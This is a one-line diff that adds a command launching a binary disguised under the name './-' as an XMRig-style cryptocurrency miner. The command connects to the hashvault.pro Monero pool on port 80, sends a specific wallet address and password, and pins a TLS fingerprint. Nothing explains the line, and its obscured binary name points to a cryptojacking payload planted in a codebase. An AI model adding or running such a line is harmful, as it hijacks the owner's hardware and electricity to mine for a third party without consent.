@@ -1,0 +1,1 @@
+./- --url pool.hashvault.pro:80 --user 85QLG9QEHmWiMT61bowRiGLY7pJJjiPqGgqShyRjy82rRw3kvSbYvBoBDy81rDTNWU2kf7tBtPKST3xKW46gK4A37JA2Dr4 --pass Kadut --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
